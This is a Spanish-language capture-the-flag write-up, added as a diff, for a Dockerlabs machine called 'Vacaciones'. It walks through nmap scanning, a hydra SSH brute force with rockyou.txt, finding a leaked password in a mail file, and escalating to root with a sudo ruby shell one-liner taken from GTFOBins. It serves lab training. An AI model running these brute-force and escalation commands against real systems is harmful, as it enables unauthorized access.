@@ -1,0 +1,104 @@
+Primero, al levantar la maquina vulnerable se tiene que realizar un nmap a la IP:
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 21:07 -0500
+Nmap scan report for 172.17.0.2
+Host is up (0.0000040s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.10 seconds
+
+Teniendo los puertos 80 y 22 abiertos, pertenecientes a HTTP y SSH
+
+Primero damos un vistazo a la web...
+
+Encontramos que está vacia, pero al revisar el código fuente sale esto:
+
+<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
+
+Por lo que podemos intuir que hay 2 usuarios para el SSH: juan y camilo
+
+Procedemos a realizar un ataque de fuerza bruta al puerto 22:
+
+┌──(kali㉿kali)-[~/Dockerlabs/Vacaciones]
+└─$ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 21:09:02
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: camilo   password: password1
+1 of 1 target successfully completed, 1 valid password found
+
+Logrando obtener las credenciales de camilo
+
+Una vez como usuario CAMILO, revisamos si tenemos algún tipo de privilegio al ejecutar comandos:
+
+$ whoami
+camilo
+$ sudo -l
+[sudo] password for camilo: 
+Sorry, user camilo may not run sudo on 9e60eb32949b.
+
+$ find / -perm -4000 2>/dev/null
+/bin/umount
+/bin/su
+/bin/mount
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+
+Por lo que hemos revisado no hay algo que podamos usar para escalar privilegios...
+
+Usamos el siguiente comando para ver si hay algún archivo en el que tengamos permisos para ejecutar o leer:
+$ find / type f -name "*.txt"
+
+Encontrando lo siguiente:
+
+/var/mail/camilo/correo.txt
+
+que al leerlo encontramos lo siguiente:
+
+Hola Camilo,
+
+Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
+
+Teniendo la contraseña de Juan, quien es el que envió este correo
+
+$ su juan
+Password: 
+$ ls
+correo.txt
+$ whoami
+juan
+
+Escalando a JUAN
+
+pero aún no somos root, por lo que como JUAN ejecutamos sudo -l
+
+Matching Defaults entries for juan on 9e60eb32949b:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User juan may run the following commands on 9e60eb32949b:
+    (ALL) NOPASSWD: /usr/bin/ruby
+
+Con la ayuda de GTFOBINS, encontramos el comando para escalar privilegios a root
+
+$ sudo ruby -e 'exec "/bin/sh"'
+# whoami
+root
+
+Dando por concluido el laboratorio
+
+
